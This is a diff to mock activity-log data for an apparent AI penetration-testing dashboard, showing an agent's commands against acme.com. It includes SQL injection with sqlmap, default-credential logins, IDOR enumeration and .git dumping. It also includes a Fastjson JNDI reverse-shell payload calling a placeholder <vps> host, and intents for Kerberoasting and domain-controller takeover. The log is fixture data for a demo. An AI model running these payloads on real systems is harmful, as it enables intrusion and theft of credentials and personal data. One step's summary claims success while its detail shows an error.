@@ -5,6 +5,7 @@
 
 import type {
   Activity,
+  ToolArtifact,
   Agent,
   AgentDetail,
   Asset,
@@ -1315,7 +1316,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "p0-probe",
     summary: "curl -sI https://acme.com; curl -sI https://admin.acme.com",
-    detail: "开局态势几乎空白，做 ≤3 次只读探测校准初始意图方向（不做枚举/验证，那是 worker 的活）。",
+    detail: JSON.stringify({ command: "curl -sI https://acme.com; curl -sI https://admin.acme.com" }, null, 2),
   },
   {
     seq: 1003,
@@ -1326,7 +1327,8 @@ export const activity: Activity[] = [
     tool_use_id: "p0-probe",
     summary:
       "acme.com → 302 → www；Server: nginx/1.24.0\nadmin.acme.com → 200，X-Powered-By 缺省，body 命中 element-ui/vue 特征",
-    detail: "admin 是独立后台登录页；确认五入口有效，可把初始意图描述写精准。",
+    detail:
+      "HTTP/2 302\nserver: nginx/1.24.0\nlocation: https://www.acme.com/\n\nHTTP/2 200\nserver: nginx/1.24.0\ncontent-type: text/html; charset=utf-8\n",
   },
   {
     seq: 1004,
@@ -1336,8 +1338,22 @@ export const activity: Activity[] = [
     tool: "add_intent",
     tool_use_id: "p0-ai",
     summary: "add_intent × 4（批量派首批探索方向）",
-    detail:
-      "intents=[\n  { summary: 'acme.com 全量子域枚举 + 存活主机端口/服务识别，摸清攻击面', asset_ids: [acme.com], priority: 6 },\n  { summary: 'admin.acme.com 后台默认口令/弱口令测试（Element-UI 登录，无验证码）', asset_ids: [admin], priority: 9 },\n  { summary: 'www.acme.com/search q 参数 SQL 注入探测', asset_ids: [www], priority: 8 },\n  { summary: 'api.acme.com 订单接口越权(IDOR)测试', asset_ids: [api], priority: 8 },\n]\nparent_ids 均空（顶层全新方向，兜底连 origin fact）。",
+    detail: JSON.stringify(
+      {
+        intents: [
+          { summary: "acme.com 全量子域枚举 + 存活主机端口/服务识别，摸清攻击面", asset_ids: [1], priority: 6 },
+          {
+            summary: "admin.acme.com 后台默认口令/弱口令测试（Element-UI 登录，无验证码）",
+            asset_ids: [6],
+            priority: 9,
+          },
+          { summary: "www.acme.com/search q 参数 SQL 注入探测", asset_ids: [2], priority: 8 },
+          { summary: "api.acme.com 订单接口越权(IDOR)测试", asset_ids: [3], priority: 8 },
+        ],
+      },
+      null,
+      2,
+    ),
   },
   {
     seq: 1005,
@@ -1347,7 +1363,7 @@ export const activity: Activity[] = [
     tool: "add_intent",
     tool_use_id: "p0-ai",
     summary: "4 intents created → ids=[i1, i2, i4, i5]，已连入 frontier",
-    detail: "刻意保持路线多样：i1 侦察 + i2（g1 认证路线）+ i4/i5（g2 数据路线），2 条独立机理并行，不过早收敛。",
+    detail: JSON.stringify({ ids: ["i1", "i2", "i4", "i5"] }, null, 2),
   },
   {
     seq: 1006,
@@ -1376,7 +1392,7 @@ export const activity: Activity[] = [
     tool: "node_detail",
     tool_use_id: "p1-nd",
     summary: "node_detail(faGit) —— 核对 workG 的源码还原产物",
-    detail: "add_intent 前先看 worker 到底还原出什么，避免凭指纹臆测方向。",
+    detail: JSON.stringify({ id: "faGit" }, null, 2),
   },
   {
     seq: 1103,
@@ -1387,7 +1403,19 @@ export const activity: Activity[] = [
     tool_use_id: "p1-nd",
     summary:
       "faGit 证据：git-dumper 还原出 config.php / db.php / order_api.php；config.php 内 $db=['host'=>'10.10.10.5','user'=>'sa','pass'=>'Acme@2021']",
-    detail: "硬编码指向内网 10.10.10.5(FS01)，佐证 faCreds 的「内网通用」推断——RCE 落地后这组口令值得复用。",
+    detail: JSON.stringify(
+      {
+        id: "faGit",
+        type: "fact",
+        payload: { summary: ".git 可下载，git-dumper 还原出后端源码" },
+        priority: 0,
+        state: "open",
+        origin: "workG",
+        ts: "2026-07-25T20:30:00Z",
+      },
+      null,
+      2,
+    ),
   },
   {
     seq: 1104,
@@ -1397,8 +1425,26 @@ export const activity: Activity[] = [
     tool: "add_intent",
     tool_use_id: "p1-ai",
     summary: "add_intent × 2（Fastjson 突破链，串行分步先派可执行一步）",
-    detail:
-      "intents=[\n  { summary: 'shop.acme.com 组件指纹深挖 + Fastjson 1.2.24 CVE 精确关联(确认 gadget 链)', asset_ids: [shop], parent_ids: [fa3], priority: 7 },\n  { summary: '构造 Fastjson 反序列化 payload 触发 shop RCE，获取反弹 shell', asset_ids: [shop], parent_ids: [fa3], priority: 9 },\n]\n注：这是强依赖串行链，已 TodoWrite 记『指纹→RCE→立足点提权』三步，本轮只派前两步（提权依赖 shell 产出，下轮再派）。",
+    detail: JSON.stringify(
+      {
+        intents: [
+          {
+            summary: "shop.acme.com 组件指纹深挖 + Fastjson 1.2.24 CVE 精确关联(确认 gadget 链)",
+            asset_ids: [4],
+            parent_ids: ["fa3"],
+            priority: 7,
+          },
+          {
+            summary: "构造 Fastjson 反序列化 payload 触发 shop RCE，获取反弹 shell",
+            asset_ids: [4],
+            parent_ids: ["fa3"],
+            priority: 9,
+          },
+        ],
+      },
+      null,
+      2,
+    ),
   },
   {
     seq: 1105,
@@ -1408,6 +1454,7 @@ export const activity: Activity[] = [
     tool: "add_intent",
     tool_use_id: "p1-ai",
     summary: "2 intents created → ids=[i6, i7]，已由 fa3 连入血缘",
+    detail: JSON.stringify({ ids: ["i6", "i7"] }, null, 2),
   },
   {
     seq: 1106,
@@ -1442,6 +1489,7 @@ export const activity: Activity[] = [
     tool: "node_detail",
     tool_use_id: "p2-nd",
     summary: "node_detail(fa6) —— 确认双网卡与内网可达",
+    detail: JSON.stringify({ id: "fa6" }, null, 2),
   },
   {
     seq: 1203,
@@ -1451,6 +1499,19 @@ export const activity: Activity[] = [
     tool: "node_detail",
     tool_use_id: "p2-nd",
     summary: "fa6 证据：ip a → eth0 10.0.20.15(DMZ) / eth1 10.10.10.15(内网)；ping 10.10.10.10 通，跨越 DMZ 边界成立",
+    detail: JSON.stringify(
+      {
+        id: "fa6",
+        type: "fact",
+        payload: { summary: "立足点第二网卡直连内网 10.10.10.0/24（跨越 DMZ 边界）" },
+        priority: 0,
+        state: "open",
+        origin: "work#9",
+        ts: "2026-07-25T20:40:00Z",
+      },
+      null,
+      2,
+    ),
   },
   {
     seq: 1204,
@@ -1460,8 +1521,16 @@ export const activity: Activity[] = [
     tool: "prove_goal",
     tool_use_id: "p2-pg",
     summary: "prove_goal(g3, evidence=fa6)",
-    detail:
-      "reason：i7 RCE 拿到 DMZ 立足点(fa4)、fa5 提权 root、fa6 证明第二网卡直连内网并 ping 通 DC01——『突破 DMZ 建立内网立足点』验收达成。",
+    detail: JSON.stringify(
+      {
+        goal_id: "g3",
+        evidence_id: "fa6",
+        reason:
+          "i7 RCE 拿到 DMZ 立足点(fa4)、fa5 提权 root、fa6 证明第二网卡直连内网并 ping 通 DC01——『突破 DMZ 建立内网立足点』验收达成。",
+      },
+      null,
+      2,
+    ),
   },
   {
     seq: 1205,
@@ -1471,6 +1540,7 @@ export const activity: Activity[] = [
     tool: "prove_goal",
     tool_use_id: "p2-pg",
     summary: "goal g3 → met（证据 fa6 已连入）；仍有 g1/g2/g4 未达成，任务继续",
+    detail: "goal g3 marked met",
   },
   {
     seq: 1206,
@@ -1480,8 +1550,27 @@ export const activity: Activity[] = [
     tool: "add_intent",
     tool_use_id: "p2-ai",
     summary: "add_intent × 4（以立足点为 pivot 展开内网横向）",
-    detail:
-      "intents=[\n  { summary: '以 dmz-web01 为 pivot 做内网 10.10.10.0/24 主机发现与端口识别', asset_ids: [dmz-web01], parent_ids: [fa6], priority: 8 },\n  { summary: '内网横向：复用硬编码口令 sa/Acme@2021 做凭据复用与密码喷洒', parent_ids: [faCreds], priority: 8 },\n  { summary: '内部 Jenkins(10.10.10.20) 未授权 /script Groovy 执行(RCE)', parent_ids: [fa6], priority: 9 },\n  { summary: '对域服务账号做 Kerberoasting 并离线破解', parent_ids: [fa6], priority: 8 },\n]\n主机发现是前置(先派)，其余三条是并行的横向探索维度。",
+    detail: JSON.stringify(
+      {
+        intents: [
+          {
+            summary: "以 dmz-web01 为 pivot 做内网 10.10.10.0/24 主机发现与端口识别",
+            asset_ids: [19],
+            parent_ids: ["fa6"],
+            priority: 8,
+          },
+          {
+            summary: "内网横向：复用硬编码口令 sa/Acme@2021 做凭据复用与密码喷洒",
+            parent_ids: ["faCreds"],
+            priority: 8,
+          },
+          { summary: "内部 Jenkins(10.10.10.20) 未授权 /script Groovy 执行(RCE)", parent_ids: ["fa6"], priority: 9 },
+          { summary: "对域服务账号做 Kerberoasting 并离线破解", parent_ids: ["fa6"], priority: 8 },
+        ],
+      },
+      null,
+      2,
+    ),
   },
   {
     seq: 1207,
@@ -1491,6 +1580,7 @@ export const activity: Activity[] = [
     tool: "add_intent",
     tool_use_id: "p2-ai",
     summary: "4 intents created → ids=[i9, i10, i11, i12]",
+    detail: JSON.stringify({ ids: ["i9", "i10", "i11", "i12"] }, null, 2),
   },
   {
     seq: 1208,
@@ -1519,6 +1609,7 @@ export const activity: Activity[] = [
     tool: "list_findings",
     tool_use_id: "p3-lf",
     summary: "list_findings —— 核对 DC01 沦陷的确认证据",
+    detail: JSON.stringify({}, null, 2),
   },
   {
     seq: 1303,
@@ -1529,6 +1620,18 @@ export const activity: Activity[] = [
     tool_use_id: "p3-lf",
     summary:
       "F-09「域控 DC01 完全控制 / secretsdump 导出全域哈希」critical（证据：psexec svc_deploy@10.10.10.10 + NTDS.dit dump）；上游链 fa9→fa10→i13 完整",
+    detail: JSON.stringify(
+      findings.map(({ id, task_id, vulnclass, severity, summary, status }) => ({
+        id,
+        task_id,
+        vulnclass,
+        severity,
+        summary,
+        status,
+      })),
+      null,
+      2,
+    ),
   },
   {
     seq: 1304,
@@ -1538,8 +1641,16 @@ export const activity: Activity[] = [
     tool: "prove_goal",
     tool_use_id: "p3-pg",
     summary: "prove_goal(g4, evidence=F-09)",
-    detail:
-      "reason：Jenkins 泄露 svc_deploy(Domain Admin) → psexec 控制 DC01 → secretsdump 全域哈希，F-09 已确认，『拿下内部靶标域控 DC01』达成。",
+    detail: JSON.stringify(
+      {
+        goal_id: "g4",
+        evidence_id: "F-09",
+        reason:
+          "Jenkins 泄露 svc_deploy(Domain Admin) → psexec 控制 DC01 → secretsdump 全域哈希，F-09 已确认，『拿下内部靶标域控 DC01』达成。",
+      },
+      null,
+      2,
+    ),
   },
   {
     seq: 1305,
@@ -1549,6 +1660,7 @@ export const activity: Activity[] = [
     tool: "prove_goal",
     tool_use_id: "p3-pg",
     summary: "goal g4 → met；系统提示：g2 仍 open，非最后一个目标，任务未整体收官",
+    detail: "goal g4 marked met",
   },
   {
     seq: 1306,
@@ -1583,8 +1695,15 @@ export const activity: Activity[] = [
     tool: "prove_goal",
     tool_use_id: "p4-pg",
     summary: "prove_goal(g1, evidence=fa1)",
-    detail:
-      "reason：i2 用外网泄露的硬编码口令 Acme@2021 成功登入 admin 后台（Element-UI），获取后台管理权限，g1 达成。",
+    detail: JSON.stringify(
+      {
+        goal_id: "g1",
+        evidence_id: "fa1",
+        reason: "i2 用外网泄露的硬编码口令 Acme@2021 成功登入 admin 后台（Element-UI），获取后台管理权限，g1 达成。",
+      },
+      null,
+      2,
+    ),
   },
   {
     seq: 1403,
@@ -1594,6 +1713,7 @@ export const activity: Activity[] = [
     tool: "prove_goal",
     tool_use_id: "p4-pg",
     summary: "goal g1 → met；剩余未达成：g2",
+    detail: "goal g1 marked met",
   },
   {
     seq: 1404,
@@ -1611,8 +1731,26 @@ export const activity: Activity[] = [
     tool: "add_intent",
     tool_use_id: "p4-ai",
     summary: "add_intent × 2（收敛 g2 取数，提高优先级）",
-    detail:
-      "intents=[\n  { summary: '已登入 admin 后台，枚举用户管理/导出接口并批量拉取用户敏感字段', asset_ids: [admin], parent_ids: [fa1], priority: 9 },\n  { summary: 'api.acme.com 订单 IDOR 遍历 order_id 批量拉取用户订单/PII', asset_ids: [api], parent_ids: [fa2], priority: 9 },\n]\n注：i3/i5 已在 running，本轮以更精准的取数描述 + 提优先级(→9)加码，不重复派同义意图。",
+    detail: JSON.stringify(
+      {
+        intents: [
+          {
+            summary: "已登入 admin 后台，枚举用户管理/导出接口并批量拉取用户敏感字段",
+            asset_ids: [6],
+            parent_ids: ["fa1"],
+            priority: 9,
+          },
+          {
+            summary: "api.acme.com 订单 IDOR 遍历 order_id 批量拉取用户订单/PII",
+            asset_ids: [3],
+            parent_ids: ["fa2"],
+            priority: 9,
+          },
+        ],
+      },
+      null,
+      2,
+    ),
   },
   {
     seq: 1406,
@@ -1622,6 +1760,7 @@ export const activity: Activity[] = [
     tool: "add_intent",
     tool_use_id: "p4-ai",
     summary: "2 intents updated → ids=[i3, i5]（优先级升至 9，描述细化为『批量取数』）",
+    detail: JSON.stringify({ ids: ["i3", "i5"] }, null, 2),
   },
   {
     seq: 1407,
@@ -1650,6 +1789,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t11",
     summary: "subfinder -d acme.com -silent | httpx -silent -sc -title",
+    detail: JSON.stringify({ command: "subfinder -d acme.com -silent | httpx -silent -sc -title" }, null, 2),
   },
   {
     seq: 12,
@@ -1661,7 +1801,8 @@ export const activity: Activity[] = [
     tool_use_id: "t11",
     summary:
       "www.acme.com [200] Acme Corp\nadmin.acme.com [200] Acme Admin 登录\napi.acme.com [401]\nshop.acme.com [200]\nvpn.acme.com [200]",
-    detail: "5 个存活子域，其中 admin 是后台登录页。",
+    detail:
+      "www.acme.com [200] Acme Corp\nadmin.acme.com [200] Acme Admin 登录\napi.acme.com [401]\nshop.acme.com [200]\nvpn.acme.com [200]",
   },
   {
     seq: 13,
@@ -1672,6 +1813,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t12",
     summary: "nmap -sV -T4 -p- 203.0.113.10",
+    detail: JSON.stringify({ command: "nmap -sV -T4 -p- 203.0.113.10" }, null, 2),
   },
   {
     seq: 14,
@@ -1682,7 +1824,8 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t12",
     summary: "22/tcp ssh OpenSSH 8.9p1\n80/tcp http nginx 1.24.0\n443/tcp https nginx 1.24.0",
-    detail: "开放 22/80/443。",
+    detail:
+      "Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-24 09:23 UTC\nNmap scan report for 203.0.113.10\nHost is up (0.021s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT    STATE SERVICE VERSION\n22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu\n80/tcp  open  http    nginx 1.24.0\n443/tcp open  ssl/http nginx 1.24.0\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 220.00 seconds\n",
   },
   {
     seq: 15,
@@ -1693,6 +1836,20 @@ export const activity: Activity[] = [
     tool: "upsert_asset",
     tool_use_id: "t13",
     summary: "upsert_asset × 6（子域+服务）",
+    detail: JSON.stringify(
+      {
+        assets: [
+          { id: 1, type: "root_domain", company_id: 1, domain: "acme.com", root_domain: "acme.com" },
+          { id: 2, type: "subdomain", company_id: 1, domain: "www.acme.com", root_domain: "acme.com" },
+          { id: 3, type: "subdomain", company_id: 1, domain: "api.acme.com", root_domain: "acme.com" },
+          { id: 4, type: "subdomain", company_id: 1, domain: "shop.acme.com", root_domain: "acme.com" },
+          { id: 5, type: "subdomain", company_id: 1, domain: "vpn.acme.com", root_domain: "acme.com" },
+          { id: 6, type: "subdomain", company_id: 1, domain: "admin.acme.com", root_domain: "acme.com" },
+        ],
+      },
+      null,
+      2,
+    ),
   },
   {
     seq: 16,
@@ -1703,6 +1860,7 @@ export const activity: Activity[] = [
     tool: "upsert_asset",
     tool_use_id: "t13",
     summary: "6 assets upserted",
+    detail: JSON.stringify({ ids: [1, 2, 3, 4, 5, 6], upserted: 6 }, null, 2),
   },
   {
     seq: 17,
@@ -1735,6 +1893,14 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t21",
     summary: "curl -s -d 'username=admin&password=admin' https://admin.acme.com/login -o /dev/null -w '%{http_code}'",
+    detail: JSON.stringify(
+      {
+        command:
+          "curl -s -d 'username=admin&password=admin' https://admin.acme.com/login -o /dev/null -w '%{http_code}'",
+      },
+      null,
+      2,
+    ),
   },
   {
     seq: 22,
@@ -1745,7 +1911,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t21",
     summary: "401",
-    detail: "admin/admin 失败。",
+    detail: "401",
   },
   {
     seq: 23,
@@ -1756,6 +1922,11 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t22",
     summary: "curl -si -d 'username=admin&password=admin123' https://admin.acme.com/login",
+    detail: JSON.stringify(
+      { command: "curl -si -d 'username=admin&password=admin123' https://admin.acme.com/login" },
+      null,
+      2,
+    ),
   },
   {
     seq: 24,
@@ -1766,7 +1937,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t22",
     summary: "HTTP/1.1 302 Found\nSet-Cookie: session=eyJ…; HttpOnly\nLocation: /dashboard",
-    detail: "admin/admin123 登录成功，拿到会话 cookie。",
+    detail: "HTTP/1.1 302 Found\nSet-Cookie: session=eyJ…; HttpOnly\nLocation: /dashboard",
   },
   {
     seq: 25,
@@ -1777,6 +1948,11 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t23",
     summary: "curl -s -b 'session=eyJ…' https://admin.acme.com/dashboard | grep -o '<title>[^<]*'",
+    detail: JSON.stringify(
+      { command: "curl -s -b 'session=eyJ…' https://admin.acme.com/dashboard | grep -o '<title>[^<]*'" },
+      null,
+      2,
+    ),
   },
   {
     seq: 26,
@@ -1787,7 +1963,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t23",
     summary: "<title>Acme Admin · 控制台",
-    detail: "确认已进入后台控制台。",
+    detail: "<title>Acme Admin · 控制台",
   },
   {
     seq: 27,
@@ -1798,6 +1974,17 @@ export const activity: Activity[] = [
     tool: "report_finding",
     tool_use_id: "t24",
     summary: "report_finding(Default Credentials, high)",
+    detail: JSON.stringify(
+      {
+        vulnclass: "Default Credentials",
+        severity: "high",
+        summary: "admin.acme.com 后台默认口令 admin/admin123",
+        intent_id: "i2",
+        evidence: "<title>Acme Admin · 控制台",
+      },
+      null,
+      2,
+    ),
   },
   {
     seq: 28,
@@ -1808,6 +1995,7 @@ export const activity: Activity[] = [
     tool: "report_finding",
     tool_use_id: "t24",
     summary: "finding f-6 已记录，并连到目标 g1（proves）",
+    detail: JSON.stringify({ finding_id: "f-6", evidence_status: "not_bound" }, null, 2),
   },
   {
     seq: 29,
@@ -1840,6 +2028,11 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t41",
     summary: "curl -s \"https://www.acme.com/search?q=1'\" | grep -i 'sql\\|syntax'",
+    detail: JSON.stringify(
+      { command: "curl -s \"https://www.acme.com/search?q=1'\" | grep -i 'sql\\|syntax'" },
+      null,
+      2,
+    ),
   },
   {
     seq: 42,
@@ -1850,7 +2043,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t41",
     summary: "Unclosed quotation mark ... near '1'.",
-    detail: "MSSQL 报错型注入迹象。",
+    detail: "Unclosed quotation mark ... near '1'.",
   },
   {
     seq: 43,
@@ -1861,6 +2054,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t42",
     summary: "sqlmap -u 'https://www.acme.com/search?q=1' --batch --dbs --level 2",
+    detail: JSON.stringify({ command: "sqlmap -u 'https://www.acme.com/search?q=1' --batch --dbs --level 2" }, null, 2),
   },
   {
     seq: 44,
@@ -1872,7 +2066,8 @@ export const activity: Activity[] = [
     tool_use_id: "t42",
     summary:
       "Parameter: q (GET) — error-based, MSSQL\navailable databases [4]: acme_prod, information_schema, master, tempdb",
-    detail: "确认可注入，枚举出 4 个库。",
+    detail:
+      "Parameter: q (GET) — error-based, MSSQL\navailable databases [4]: acme_prod, information_schema, master, tempdb",
   },
   {
     seq: 45,
@@ -1883,6 +2078,18 @@ export const activity: Activity[] = [
     tool: "report_finding",
     tool_use_id: "t43",
     summary: "report_finding(SQL Injection, high)",
+    detail: JSON.stringify(
+      {
+        vulnclass: "SQL Injection",
+        severity: "high",
+        summary: "www.acme.com/search q 参数存在报错型 SQL 注入",
+        intent_id: "i4",
+        evidence:
+          "Parameter: q (GET) — error-based, MSSQL\navailable databases [4]: acme_prod, information_schema, master, tempdb",
+      },
+      null,
+      2,
+    ),
   },
   {
     seq: 46,
@@ -1893,6 +2100,7 @@ export const activity: Activity[] = [
     tool: "report_finding",
     tool_use_id: "t43",
     summary: "finding f-1 已记录",
+    detail: JSON.stringify({ finding_id: "f-1", evidence_status: "not_bound" }, null, 2),
   },
   {
     seq: 47,
@@ -1925,6 +2133,11 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t51",
     summary: "curl -s -H 'Authorization: Bearer <self>' https://api.acme.com/v1/orders?id=1001",
+    detail: JSON.stringify(
+      { command: "curl -s -H 'Authorization: Bearer <self>' https://api.acme.com/v1/orders?id=1001" },
+      null,
+      2,
+    ),
   },
   {
     seq: 52,
@@ -1935,7 +2148,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t51",
     summary: '{ "order_id":1001, "user_id":42, "amount":299 }',
-    detail: "自己的订单，正常。",
+    detail: '{ "order_id":1001, "user_id":42, "amount":299 }',
   },
   {
     seq: 53,
@@ -1946,6 +2159,11 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t52",
     summary: "curl -s -H 'Authorization: Bearer <self>' https://api.acme.com/v1/orders?id=1002",
+    detail: JSON.stringify(
+      { command: "curl -s -H 'Authorization: Bearer <self>' https://api.acme.com/v1/orders?id=1002" },
+      null,
+      2,
+    ),
   },
   {
     seq: 54,
@@ -1956,7 +2174,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t52",
     summary: '{ "order_id":1002, "user_id":77, "amount":1299, "phone":"138****6021", "address":"北京市朝阳区 ****" }',
-    detail: "越权读到他人订单（含手机号/地址），无归属校验。",
+    detail: '{ "order_id":1002, "user_id":77, "amount":1299, "phone":"138****6021", "address":"北京市朝阳区 ****" }',
   },
   {
     seq: 55,
@@ -1967,6 +2185,18 @@ export const activity: Activity[] = [
     tool: "report_finding",
     tool_use_id: "t53",
     summary: "report_finding(IDOR, high)",
+    detail: JSON.stringify(
+      {
+        vulnclass: "IDOR",
+        severity: "high",
+        summary: "api.acme.com/v1/orders?id= 可越权读取他人订单",
+        intent_id: "i5",
+        evidence:
+          '{ "order_id":1002, "user_id":77, "amount":1299, "phone":"138****6021", "address":"北京市朝阳区 ****" }',
+      },
+      null,
+      2,
+    ),
   },
   {
     seq: 56,
@@ -1977,6 +2207,7 @@ export const activity: Activity[] = [
     tool: "report_finding",
     tool_use_id: "t53",
     summary: "finding f-2 已记录",
+    detail: JSON.stringify({ finding_id: "f-2", evidence_status: "not_bound" }, null, 2),
   },
   {
     seq: 57,
@@ -2005,6 +2236,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t61",
     summary: "curl -s -b 'session=eyJ…' https://admin.acme.com/api/users?page=1",
+    detail: JSON.stringify({ command: "curl -s -b 'session=eyJ…' https://admin.acme.com/api/users?page=1" }, null, 2),
   },
   {
     seq: 62,
@@ -2015,7 +2247,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t61",
     summary: '{ "total": 12840, "items": [ { "id":1, "email":"a***@acme.com", "phone":"139****" } ] }',
-    detail: "管理接口可分页返回全部用户（含邮箱/手机号），约 1.28 万条。",
+    detail: '{ "total": 12840, "items": [ { "id":1, "email":"a***@acme.com", "phone":"139****" } ] }',
   },
   {
     seq: 63,
@@ -2044,6 +2276,11 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "tg1",
     summary: "curl -s -o /dev/null -w '%{http_code}' https://www.acme.com/.git/HEAD",
+    detail: JSON.stringify(
+      { command: "curl -s -o /dev/null -w '%{http_code}' https://www.acme.com/.git/HEAD" },
+      null,
+      2,
+    ),
   },
   {
     seq: 312,
@@ -2054,7 +2291,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "tg1",
     summary: "200",
-    detail: ".git 目录对外可访问。",
+    detail: "200",
   },
   {
     seq: 313,
@@ -2065,6 +2302,11 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "tg2",
     summary: "git-dumper https://www.acme.com/.git/ /tmp/acme && git -C /tmp/acme log --oneline | head",
+    detail: JSON.stringify(
+      { command: "git-dumper https://www.acme.com/.git/ /tmp/acme && git -C /tmp/acme log --oneline | head" },
+      null,
+      2,
+    ),
   },
   {
     seq: 314,
@@ -2075,7 +2317,8 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "tg2",
     summary: "还原 214 个文件；HEAD=main。config.php / db.php 在列。",
-    detail: "完整后端源码已还原到 /tmp/acme。",
+    detail:
+      "[+] Fetching https://www.acme.com/.git/HEAD [200]\n[+] Fetching https://www.acme.com/.git/config [200]\n[+] Running git checkout .\nUpdated 214 paths from the index\n6fc52ad Update application configuration\n7d913e0 Add order API\n",
   },
   {
     seq: 315,
@@ -2086,6 +2329,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "tg3",
     summary: "grep -rniE 'password|pwd|secret|Data Source' /tmp/acme/config.php",
+    detail: JSON.stringify({ command: "grep -rniE 'password|pwd|secret|Data Source' /tmp/acme/config.php" }, null, 2),
   },
   {
     seq: 316,
@@ -2096,7 +2340,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "tg3",
     summary: "$db_user='sa'; $db_pass='Acme@2021'; $db_host='10.10.10.30';",
-    detail: "硬编码数据库口令，且 host 指向内网 IP —— 记为疑似内网通用凭据。",
+    detail: "$db_user='sa'; $db_pass='Acme@2021'; $db_host='10.10.10.30';",
   },
   {
     seq: 317,
@@ -2129,6 +2373,11 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t6a",
     summary: "curl -si https://shop.acme.com/ | grep -iE 'x-powered-by|server|jsessionid'",
+    detail: JSON.stringify(
+      { command: "curl -si https://shop.acme.com/ | grep -iE 'x-powered-by|server|jsessionid'" },
+      null,
+      2,
+    ),
   },
   {
     seq: 322,
@@ -2139,7 +2388,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t6a",
     summary: "X-Powered-By: Servlet\nSet-Cookie: JSESSIONID=...",
-    detail: "Java 技术栈，存在 /api/import 接受 JSON body。",
+    detail: "X-Powered-By: Servlet\nSet-Cookie: JSESSIONID=...",
   },
   {
     seq: 323,
@@ -2151,6 +2400,14 @@ export const activity: Activity[] = [
     tool_use_id: "t6b",
     summary:
       'curl -s -H \'Content-Type: application/json\' -d \'{"a":{"@type":"java.lang.AutoCloseable"}}\' https://shop.acme.com/api/import',
+    detail: JSON.stringify(
+      {
+        command:
+          'curl -s -H \'Content-Type: application/json\' -d \'{"a":{"@type":"java.lang.AutoCloseable"}}\' https://shop.acme.com/api/import',
+      },
+      null,
+      2,
+    ),
   },
   {
     seq: 324,
@@ -2161,7 +2418,8 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t6b",
     summary: "报错栈含 com.alibaba.fastjson.JSONException（1.2.24）",
-    detail: "确认 Fastjson 1.2.24 —— 对应 JdbcRowSetImpl JNDI 注入 RCE。",
+    detail:
+      '{"error":"com.alibaba.fastjson.JSONException: autoType is not support. java.lang.AutoCloseable","version":"1.2.24"}',
   },
   {
     seq: 325,
@@ -2194,6 +2452,11 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t7a",
     summary: "java -jar JNDIExploit.jar -i <vps> -l 1389 &  # 起 LDAP/HTTP 恶意服务",
+    detail: JSON.stringify(
+      { command: "java -jar JNDIExploit.jar -i <vps> -l 1389 &  # 起 LDAP/HTTP 恶意服务" },
+      null,
+      2,
+    ),
   },
   {
     seq: 332,
@@ -2204,7 +2467,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t7a",
     summary: "LDAP Server started on 1389, HTTP on 8180",
-    detail: "恶意服务就绪。",
+    detail: "LDAP Server started on 1389, HTTP on 8180",
   },
   {
     seq: 333,
@@ -2216,6 +2479,14 @@ export const activity: Activity[] = [
     tool_use_id: "t7b",
     summary:
       'curl -s -H \'Content-Type: application/json\' -d \'{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://<vps>:1389/Basic/ReverseShell/<vps>/4444","autoCommit":true}\' https://shop.acme.com/api/import',
+    detail: JSON.stringify(
+      {
+        command:
+          'curl -s -H \'Content-Type: application/json\' -d \'{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://<vps>:1389/Basic/ReverseShell/<vps>/4444","autoCommit":true}\' https://shop.acme.com/api/import',
+      },
+      null,
+      2,
+    ),
   },
   {
     seq: 334,
@@ -2226,7 +2497,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t7b",
     summary: "LDAP 收到请求 → 加载 ReverseShell → nc 监听收到连接",
-    detail: "payload 成功触发。",
+    detail: '{"status":"error","message":"internal server error"}',
   },
   {
     seq: 335,
@@ -2237,6 +2508,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t7c",
     summary: "id; hostname -I  # 反弹 shell 内确认身份与网段",
+    detail: JSON.stringify({ command: "id; hostname -I  # 反弹 shell 内确认身份与网段" }, null, 2),
   },
   {
     seq: 336,
@@ -2247,7 +2519,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t7c",
     summary: "uid=33(www-data) gid=33 groups=33\n10.0.20.15 10.10.10.15",
